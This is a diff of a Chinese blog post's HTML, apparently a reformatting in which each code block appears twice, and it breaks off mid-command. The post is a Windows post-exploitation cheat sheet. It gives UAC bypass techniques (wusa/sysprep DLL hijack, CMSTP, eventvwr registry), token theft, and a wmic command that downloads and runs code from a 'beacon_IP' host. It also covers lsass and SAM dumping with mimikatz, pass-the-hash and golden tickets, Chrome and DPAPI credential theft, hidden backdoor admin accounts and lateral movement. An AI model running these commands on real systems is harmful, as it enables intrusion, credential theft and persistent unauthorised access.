-2. 管理员(High): 在Windows Vista之前的系统，默认创建的管理员账户即对应完整管理员(High)级别，这个级别基本没有限制，导致可以任意添加计划任务，写关键路径，读写关键注册表、创建服务、加载驱动等等
-
-3. 用户(Medium): 从Windows Vista开始创建的管理员账户均在用户(Medium)级别，当UAC(默认)开启的情况下，这个级别会有很多限制，仅当程序请求管理员权限，或是触发条件则弹窗询问用户授权。
-
-4. 受限(Low): 受限(Low)被应用于IE浏览器作为保护模式使用，其直接访问网页的进程会通过Host主进程代理操作系统资源，只有在Temp、Temporary、Internet Files、Cookies和Favorites目录下的几个特定低完整性目录可以进行写操作，同时启动其他进程时弹窗询问用户。
-</code></pre>
 <p>但由于微软出于兼容性、用户体验等的考虑，为减少UAC弹窗，设定了自动提权的机制，满足以下两个条件的程序，会自动提升权限</p>
-<pre><code>1. 必须经过 Windows Publisher 数字签名
-2. 必须位于”安全目录“中，其中”安全目录“指的是普通用户(Medium)无权修改的，包括
-    1) %SystemRoot%\System32（例如，\Windows\System32）
-    2) 及其大多数子目录、%SystemRoot%\Ehome
-    3) 以及 %ProgramFiles% 下的少许目录（其中包括 Windows Defender 和 Windows 日记本）
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 必须经过 Windows Publisher 数字签名</span><br><span class="line">2. 必须位于”安全目录“中，其中”安全目录“指的是普通用户(Medium)无权修改的，包括</span><br><span class="line">    1) %SystemRoot%\System32（例如，\Windows\System32）</span><br><span class="line">    2) 及其大多数子目录、%SystemRoot%\Ehome</span><br><span class="line">    3) 以及 %ProgramFiles% 下的少许目录（其中包括 Windows Defender 和 Windows 日记本）</span><br></pre></td></tr></table></figure>
+
 <p>绕过UAC的方法的核心思想</p>
-<pre><code>1. 要充分利用基于Windows设定的&quot;自动提升&quot;机制，因为只有这个唯一的通道是可以避开UAC的。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 要充分利用基于Windows设定的&quot;自动提升&quot;机制，因为只有这个唯一的通道是可以避开UAC的。</span><br><span class="line"></span><br><span class="line">2. 显然不能或者非常难可以获得微软publisher的签名，所有只有寻找那些被系统“认可”的“具备自动提升权限”的程序去尝试“注入”或“劫持”，而“注入”这些核心进程是非常困难的，因此剩下的可探索的方向就是“劫持”</span><br><span class="line"></span><br><span class="line">3. 首先需要列出系统上存在的具备“自动提升权限”的进程，并找到它们存在dll的目录及文件名，这些dll文件名就是我们将要劫持替换的文件。</span><br><span class="line"></span><br><span class="line">4. 系统程序所在的目录往往都是核心目录，向这种目录写入dll同样是一个困难，这里依然需要使用“劫持”思想，寻找某个系统原生的程序，利用它的某个功能，实现dll的释放和替换。</span><br></pre></td></tr></table></figure>
 
-2. 显然不能或者非常难可以获得微软publisher的签名，所有只有寻找那些被系统“认可”的“具备自动提升权限”的程序去尝试“注入”或“劫持”，而“注入”这些核心进程是非常困难的，因此剩下的可探索的方向就是“劫持”
-
-3. 首先需要列出系统上存在的具备“自动提升权限”的进程，并找到它们存在dll的目录及文件名，这些dll文件名就是我们将要劫持替换的文件。
-
-4. 系统程序所在的目录往往都是核心目录，向这种目录写入dll同样是一个困难，这里依然需要使用“劫持”思想，寻找某个系统原生的程序，利用它的某个功能，实现dll的释放和替换。
-</code></pre>
 <h3 id="1-DLL劫持"><a href="#1-DLL劫持" class="headerlink" title="1. DLL劫持"></a>1. DLL劫持</h3><p>将DLL复制到 sysprep目录进行权限提升。实现这一目的的两种最流行的方式是：使用一个IFileOperation COM对象，或者使用Wusa.exe和它的“extract”选项。目前，Invoke-PsUACme使用的是Wusa方法。因为Wusa设置为了自动提升，所以可以用它来提取一个cab文件到sysprep目录</p>
-<pre><code># 通过makecab生成一个cab文件，cab中包含我们指定的恶意dll文件
-makecab C:\your_dll_path.dll C:\any_path_is_ok.cab
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 通过makecab生成一个cab文件，cab中包含我们指定的恶意dll文件</span><br><span class="line">makecab C:\your_dll_path.dll C:\any_path_is_ok.cab</span><br><span class="line"></span><br><span class="line"># 执行wusa将cab文件中的dll释放到指定目录(例如&quot;C:\Windows\System32\Sysprep\&quot;)，这一步即是劫持的过程</span><br><span class="line">&amp; wusa C:\any_path_is_ok.cab /extract:&quot;C:\Windows\System32\Sysprep\&quot;</span><br><span class="line"></span><br><span class="line"># 调用&quot;C:\Windows\System32\Sysprep\sysprep.exe&quot;，此时该进程调用的dll会被我们完成劫持，执行我们指定的dll中的恶意代码</span><br><span class="line">&amp; C:\Windows\System32\Sysprep\sysprep.exe</span><br><span class="line"></span><br><span class="line"># 使用nishang的Invoke-PsUACme可以自动完成这所有过程</span><br><span class="line">Invoke-PsUACme -method oobe -Payload &quot;powershell -noexit -c Get-Process&quot;</span><br></pre></td></tr></table></figure>
 
-# 执行wusa将cab文件中的dll释放到指定目录(例如&quot;C:\Windows\System32\Sysprep\&quot;)，这一步即是劫持的过程
-&amp; wusa C:\any_path_is_ok.cab /extract:&quot;C:\Windows\System32\Sysprep\&quot;
-
-# 调用&quot;C:\Windows\System32\Sysprep\sysprep.exe&quot;，此时该进程调用的dll会被我们完成劫持，执行我们指定的dll中的恶意代码
-&amp; C:\Windows\System32\Sysprep\sysprep.exe
-
-# 使用nishang的Invoke-PsUACme可以自动完成这所有过程
-Invoke-PsUACme -method oobe -Payload &quot;powershell -noexit -c Get-Process&quot;
-</code></pre>
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
 <h3 id="2-CMSTP配置VPN功能滥用"><a href="#2-CMSTP配置VPN功能滥用" class="headerlink" title="2. CMSTP配置VPN功能滥用"></a>2. CMSTP配置VPN功能滥用</h3><p>vpn配置程序自身提供了一个功能”RunPreSetupCommandsSection”，提供在安装开始前提供了一个执行指令的回调接口</p>
 <p>把.inf文件放置在目录下，执行该指令</p>
-<pre><code>C:/Windows/System32/cmstp.exe C:\Users\Administrator\Desktop\poc\UACBypass.inf /au
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Windows/System32/cmstp.exe C:\Users\Administrator\Desktop\poc\UACBypass.inf /au</span><br></pre></td></tr></table></figure>
+
 <p>指令过程中会弹出一个UI窗口需要点击确认，可以用powershell脚本的sendkey模拟按键来完成一键自动化UAC提权</p>
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86685">https://www.anquanke.com/post/id/86685</a></p>
-<h3 id="3-注册表劫持"><a href="#3-注册表劫持" class="headerlink" title="3. 注册表劫持"></a>3. 注册表劫持</h3><pre><code>Eventvwr.exe - Displays Windows Event Logs in a GUI window
+<h3 id="3-注册表劫持"><a href="#3-注册表劫持" class="headerlink" title="3. 注册表劫持"></a>3. 注册表劫持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Eventvwr.exe - Displays Windows Event Logs in a GUI window</span><br><span class="line"></span><br><span class="line">在&quot;eventvwr.exe&quot;启动期间，eventvwr.exe检查注册表值HKCU\Software\Classes\msc file\shell\open\command以查找mmc.exe的位置，该文件用于打开eventvwr.msc保存的控制台文件。如果将另一个二进制文件或脚本的位置添加到此注册表值，则它将作为高完整性进程执行，而不会向用户显示UAC提示</span><br></pre></td></tr></table></figure>
 
-在&quot;eventvwr.exe&quot;启动期间，eventvwr.exe检查注册表值HKCU\Software\Classes\msc file\shell\open\command以查找mmc.exe的位置，该文件用于打开eventvwr.msc保存的控制台文件。如果将另一个二进制文件或脚本的位置添加到此注册表值，则它将作为高完整性进程执行，而不会向用户显示UAC提示
-</code></pre>
 <p><em>refer:</em> <a target="_blank" rel="noopener" href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/">https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</a></p>
 <h2 id="0x06-Token-x2F-Hash窃取与提权"><a href="#0x06-Token-x2F-Hash窃取与提权" class="headerlink" title="0x06 Token&#x2F;Hash窃取与提权"></a>0x06 Token&#x2F;Hash窃取与提权</h2><h3 id="1-通过incognito枚举token"><a href="#1-通过incognito枚举token" class="headerlink" title="1. 通过incognito枚举token"></a>1. 通过incognito枚举token</h3><p>Windows有两种类型的Token：</p>
-<pre><code>a. Delegation token(授权令牌)：用于交互会话登录(例如本地用户直接登录、远程桌面登录)。具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. Delegation token(授权令牌)：用于交互会话登录(例如本地用户直接登录、远程桌面登录)。具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</span><br><span class="line"></span><br><span class="line">b. Impersonation token(模拟令牌)：用于非交互登录(利用net use访问共享文件夹) </span><br></pre></td></tr></table></figure>
 
-b. Impersonation token(模拟令牌)：用于非交互登录(利用net use访问共享文件夹) 
-</code></pre>
 <p>两种token都只在系统重启后清除，通过incognito.exe枚举token list</p>
-<pre><code>incognito.exe list_tokens -u
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure>
+
 <p>利用该token执行calc.exe</p>
-<pre><code># 通过任务管理器查看到进程的账户名为 hacker
-incognito.exe execute -c &quot;iZxkpes3z6p6ajZ\hacker&quot; calc.exe
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 通过任务管理器查看到进程的账户名为 hacker</span><br><span class="line">incognito.exe execute -c &quot;iZxkpes3z6p6ajZ\hacker&quot; calc.exe</span><br></pre></td></tr></table></figure>
+
 <p>提权至system：</p>
-<pre><code>incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br></pre></td></tr></table></figure>
+
 <h3 id="2-利用token获得TrustedInstaller权限"><a href="#2-利用token获得TrustedInstaller权限" class="headerlink" title="2. 利用token获得TrustedInstaller权限"></a>2. 利用token获得TrustedInstaller权限</h3><p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件，因为Windows系统的最高权限为TrustedInstaller</p>
 <p>查看文件夹属性，显示system不具有写入权限，只有TrustedInstaller可以，借用TrustedInstaller.exe的token创建子进程，子进程就有了TrustedInstaller权限</p>
-<pre><code>Set-NtTokenPrivilege SeDebugPrivilege
-$p = Get-NtProcess -Name TrustedInstaller.exe
-$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p
-</code></pre>
-<h3 id="3-利用cmdkey-获取令牌缓存"><a href="#3-利用cmdkey-获取令牌缓存" class="headerlink" title="3. 利用cmdkey 获取令牌缓存"></a>3. 利用cmdkey 获取令牌缓存</h3><pre><code>cmdkey /list
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-NtTokenPrivilege SeDebugPrivilege</span><br><span class="line">$p = Get-NtProcess -Name TrustedInstaller.exe</span><br><span class="line">$proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $p</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-利用cmdkey-获取令牌缓存"><a href="#3-利用cmdkey-获取令牌缓存" class="headerlink" title="3. 利用cmdkey 获取令牌缓存"></a>3. 利用cmdkey 获取令牌缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+
 <p>WMIC在向远程主机执行指令的时候，都会先默认使用缓存的凭证。攻击者可以利用本机已经缓存的令牌，直接执行指令或启动新进程</p>
-<pre><code>wmic /node:TERMSRV/47.111.191.59 process call create &quot;cmd /c calc.exe&quot;
-wmic /node:47.111.191.59 process call create &quot;cmd /c calc.exe&quot;
-wmic /node:&lt;TARGET-BOX process call create &quot;cmd /c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://beacon_IP/a&#39;))\&quot;&quot;
-</code></pre>
-<h2 id="0x07-HASH-Dump与利用"><a href="#0x07-HASH-Dump与利用" class="headerlink" title="0x07 HASH Dump与利用"></a>0x07 HASH Dump与利用</h2><h3 id="1-hash导出"><a href="#1-hash导出" class="headerlink" title="1. hash导出"></a>1. hash导出</h3><pre><code>1) reg save 方式
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:TERMSRV/47.111.191.59 process call create &quot;cmd /c calc.exe&quot;</span><br><span class="line">wmic /node:47.111.191.59 process call create &quot;cmd /c calc.exe&quot;</span><br><span class="line">wmic /node:&lt;TARGET-BOX process call create &quot;cmd /c powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://beacon_IP/a&#x27;))\&quot;&quot;</span><br></pre></td></tr></table></figure>
 
-reg save HKLM\SYSTEM sys.hiv  
-reg save HKLM\SAM sam.hiv  
-reg save hklm\security security.hiv
+<h2 id="0x07-HASH-Dump与利用"><a href="#0x07-HASH-Dump与利用" class="headerlink" title="0x07 HASH Dump与利用"></a>0x07 HASH Dump与利用</h2><h3 id="1-hash导出"><a href="#1-hash导出" class="headerlink" title="1. hash导出"></a>1. hash导出</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1) reg save 方式</span><br><span class="line"></span><br><span class="line">reg save HKLM\SYSTEM sys.hiv  </span><br><span class="line">reg save HKLM\SAM sam.hiv  </span><br><span class="line">reg save hklm\security security.hiv</span><br><span class="line"></span><br><span class="line">2) mimikatz</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit  # 离线导hash</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;log credit.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;  # 在线导hash</span><br></pre></td></tr></table></figure>
 
-2) mimikatz
+<h3 id="2-lsass-Dump"><a href="#2-lsass-Dump" class="headerlink" title="2. lsass Dump"></a>2. lsass Dump</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1）procdump</span><br><span class="line"></span><br><span class="line"># HTTP method - using the default way</span><br><span class="line">certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe</span><br><span class="line">C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line"># SMB method - using the pid</span><br><span class="line">net use Z: https://live.sysinternals.com</span><br><span class="line">tasklist /fi &quot;imagename eq lsass.exe&quot; # Find lsass&#x27;s pid</span><br><span class="line">Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp</span><br><span class="line"></span><br><span class="line">2）rundll32</span><br><span class="line"></span><br><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full</span><br><span class="line"></span><br><span class="line">3）Mimikatz</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::minidump lsass.dmp</span><br><span class="line">Switch to minidump</span><br><span class="line">mimikatz # sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
 
-mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit  # 离线导hash
+<h3 id="3-Mimikatz"><a href="#3-Mimikatz" class="headerlink" title="3. Mimikatz"></a>3. Mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1）Execute commands</span><br><span class="line"></span><br><span class="line">PS C:\temp\mimikatz&gt; .\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit # 单行</span><br><span class="line"></span><br><span class="line">PS C:\temp\mimikatz&gt; .\mimikatz  # 多行</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # log</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # sekurlsa::wdigest</span><br><span class="line"></span><br><span class="line">2）Extract passwords</span><br><span class="line"></span><br><span class="line">mimikatz_command -f sekurlsa::logonPasswords full</span><br><span class="line">mimikatz_command -f sekurlsa::wdigest</span><br><span class="line"></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1</span><br><span class="line"></span><br><span class="line">3）Pass The Hash</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell</span><br><span class="line"></span><br><span class="line">4）Golden ticket</span><br><span class="line"></span><br><span class="line">.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt</span><br><span class="line"></span><br><span class="line">.\mimikatz &quot;kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot; exit</span><br><span class="line"></span><br><span class="line">5）Skeleton key</span><br><span class="line"></span><br><span class="line"># map the share</span><br><span class="line">net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz</span><br><span class="line"># login as someone</span><br><span class="line">rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab</span><br><span class="line"></span><br><span class="line">6）RDP session takeover</span><br><span class="line"></span><br><span class="line"># get the Session ID you want to hijack</span><br><span class="line">query user</span><br><span class="line">create sesshijack binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#55&quot;</span><br><span class="line">net start sesshijack</span><br><span class="line"></span><br><span class="line">7）Chrome Cookies &amp; Credential</span><br><span class="line"></span><br><span class="line"># Saved Cookies</span><br><span class="line">dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Cookies&quot; /unprotect</span><br><span class="line">dpapi::chrome /in:&quot;C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b</span><br><span class="line"></span><br><span class="line"># Saved Credential in Chrome</span><br><span class="line">dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span><br></pre></td></tr></table></figure>
 
-mimikatz.exe &quot;log credit.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;  # 在线导hash
-</code></pre>
-<h3 id="2-lsass-Dump"><a href="#2-lsass-Dump" class="headerlink" title="2. lsass Dump"></a>2. lsass Dump</h3><pre><code>1）procdump
+<h3 id="4-DPAPI"><a href="#4-DPAPI" class="headerlink" title="4. DPAPI"></a>4. DPAPI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1) 显示凭据</span><br><span class="line"></span><br><span class="line">vaultcmd /list</span><br><span class="line"></span><br><span class="line">VaultCmd /listcreds:&lt;namevault&gt;|&lt;guidvault&gt; /all</span><br><span class="line">vaultcmd /listcreds:&quot;Windows Credentials&quot; /all</span><br><span class="line"></span><br><span class="line">2）列出凭据文件</span><br><span class="line"></span><br><span class="line">dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line">3）Mimikatz - Credential Manager &amp; DPAPI</span><br><span class="line"></span><br><span class="line"># check the folder to find credentials</span><br><span class="line">dir C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"></span><br><span class="line"># check the file with mimikatz</span><br><span class="line">mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0</span><br><span class="line"></span><br><span class="line"># find master key</span><br><span class="line">mimikatz !sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line"># use master key</span><br><span class="line">mimikatz dpapi::cred /in:C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b</span><br><span class="line"></span><br><span class="line"># find and export backup keys</span><br><span class="line">lsadump::backupkeys /system:dc01.lab.local /export</span><br><span class="line"></span><br><span class="line"># use backup keys</span><br><span class="line">dpapi::masterkey /in:&quot;C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe&quot; /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk</span><br><span class="line"></span><br><span class="line">4）DonAPI - 远程转储</span><br><span class="line"></span><br><span class="line">DonPAPI.py domain/user:passw0rd@target</span><br><span class="line">DonPAPI.py --hashes &lt;LM&gt;:&lt;NT&gt; domain/user@target</span><br><span class="line"></span><br><span class="line"># using domain backup key</span><br><span class="line">dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip</span><br><span class="line">python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list</span><br></pre></td></tr></table></figure>
 
-# HTTP method - using the default way
-certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
-C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+<h3 id="5-创建凭据"><a href="#5-创建凭据" class="headerlink" title="5. 创建凭据"></a>5. 创建凭据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">net user hacker Hcker_12345678* /add /Y</span><br><span class="line">net localgroup administrators hacker /add</span><br><span class="line">net localgroup &quot;Remote Desktop Users&quot; hacker /add # RDP access</span><br><span class="line">net localgroup &quot;Backup Operators&quot; hacker /add # Full access to files</span><br><span class="line">net group &quot;Domain Admins&quot; hacker /add /domain</span><br><span class="line"></span><br><span class="line"># enable a domain user account</span><br><span class="line">net user hacker /ACTIVE:YES /domain</span><br><span class="line"></span><br><span class="line"># prevent users from changing their password</span><br><span class="line">net user username /Passwordchg:No</span><br><span class="line"></span><br><span class="line"># prevent the password to expire</span><br><span class="line">net user hacker /Expires:Never</span><br><span class="line"></span><br><span class="line"># create a machine account (not shown in net users)</span><br><span class="line">net user /add evilbob$ evilpassword</span><br><span class="line"></span><br><span class="line"># homoglyph Aԁmіnistratοr (different of Administrator)</span><br><span class="line">Aԁmіnistratοr</span><br></pre></td></tr></table></figure>
 
-# SMB method - using the pid
-net use Z: https://live.sysinternals.com
-tasklist /fi &quot;imagename eq lsass.exe&quot; # Find lsass&#39;s pid
-Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
+<h3 id="6-凭据利用"><a href="#6-凭据利用" class="headerlink" title="6. 凭据利用"></a>6. 凭据利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1）PsExec</span><br><span class="line"></span><br><span class="line">PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe</span><br><span class="line"></span><br><span class="line"># switch admin user to NT Authority/System</span><br><span class="line">PS C:\&gt; PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s </span><br><span class="line"></span><br><span class="line">2）RDP协议</span><br><span class="line"></span><br><span class="line"># Enable RDP</span><br><span class="line">PS C:\&gt; reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f</span><br><span class="line">PS C:\&gt; netsh firewall set service remoteadmin enable</span><br><span class="line">PS C:\&gt; netsh firewall set service remotedesktop enable</span><br><span class="line"># Alternative</span><br><span class="line">C:\&gt; psexec \\machinename reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0</span><br><span class="line">root@payload$ crackmapexec 